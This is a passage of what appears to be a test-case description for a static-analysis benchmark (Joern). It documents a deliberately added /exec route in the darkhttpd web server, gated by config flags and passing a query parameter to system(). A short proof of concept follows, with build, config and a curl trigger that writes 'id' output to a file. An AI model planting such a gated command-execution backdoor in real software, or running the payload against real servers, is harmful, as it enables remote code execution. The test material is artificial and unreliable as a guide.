    6. process_request():   added exec route guarded by exec_cfg.enabled && exec_cfg.logging

EXPLOIT:
  build:   gcc -o darkhttpd darkhttpd.c
  config:  echo 'exec_mode = 1' > /tmp/e.conf && echo 'exec_logging = 1' >> /tmp/e.conf
  start:   ./darkhttpd /tmp/www --port 18117 --config /tmp/e.conf
  trigger: curl 'http://127.0.0.1:18117/exec?cmd=id>/tmp/poc_117_marker'
  verify:  cat /tmp/poc_117_marker
  expect:  uid=... line written by the server process

  gate bypass: omitting --config (or using a config without exec_mode=1 and
               exec_logging=1) causes /exec to return 404.

NOTES:
  - system() output goes to the server's stdout/stderr (inherited fds), not the
    HTTP response body. Use a write-to-file payload (id>/tmp/marker) to confirm.
  - The gate is NEVER set from argv directly; exec_mode/exec_logging can only
    be set via the config file parsed by read_exec_config().
  - Joern must model fopen → fgets → sscanf → exec_cfg.enabled/logging → guard
    to determine that the exec endpoint is reachable.
